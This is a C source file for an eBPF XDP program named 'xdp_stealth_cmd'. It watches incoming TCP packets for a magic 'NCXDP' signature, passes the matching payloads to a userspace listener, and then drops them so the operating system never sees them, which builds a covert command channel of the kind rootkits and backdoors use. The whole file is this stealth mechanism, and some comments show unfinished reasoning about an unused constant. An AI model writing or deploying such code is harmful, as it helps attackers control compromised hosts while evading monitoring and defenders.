#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/tcp.h>

/* Map to pass intercepted commands to userspace */
struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
} perf_map SEC(".maps");

/* Magic signature to look for: "NCXDP" */
#define MAGIC_SIG 0x504458434E /* "NCXDP" little endian? No, "N" is low byte. 0x4E... */
/* Let's compare byte by byte or use a simple check */

SEC("xdp")
int xdp_stealth_cmd(struct xdp_md* ctx) {
    void* data_end = (void*)(long)ctx->data_end;
    void* data = (void*)(long)ctx->data;
    struct ethhdr* eth = data;

    /* Parse Ethernet */
    if ((void*)(eth + 1) > data_end)
        return XDP_PASS;

    if (eth->h_proto != __constant_htons(ETH_P_IP))
        return XDP_PASS;

    /* Parse IP */
    struct iphdr* iph = (void*)(eth + 1);
    if ((void*)(iph + 1) > data_end)
        return XDP_PASS;

    if (iph->protocol != IPPROTO_TCP)
        return XDP_PASS;

    /* Parse TCP */
    /* IP header length is variable */
    int ip_len = iph->ihl * 4;
    struct tcphdr* tcph = (void*)iph + ip_len;
    if ((void*)(tcph + 1) > data_end)
        return XDP_PASS;

    /* Calculate payload offset */
    int tcp_len = tcph->doff * 4;
    void* payload = (void*)tcph + tcp_len;
    int payload_len = data_end - payload;

    /* Check for magic signature "NCXDP" (5 bytes) */
    if (payload_len < 5)
        return XDP_PASS;

    unsigned char* bytes = payload;
    /* N C X D P */
    if (bytes[0] == 'N' && bytes[1] == 'C' && bytes[2] == 'X' && bytes[3] == 'D' && bytes[4] == 'P') {
        /*
         * Found Magic Packet!
         * 1. Send to userspace via perf buffer.
         * 2. Return XDP_DROP to hide from kernel/OS.
         */

        /* We pass the payload (including sig or after?)
           Let's pass the whole payload length.
           bpf_perf_event_output limits size. */

        bpf_perf_event_output(ctx, &perf_map, BPF_F_CURRENT_CPU, payload, payload_len);

        return XDP_DROP; /* The Invisible Drop */
    }

    return XDP_PASS;
}

char LICENSE[] SEC("license") = "GPL";
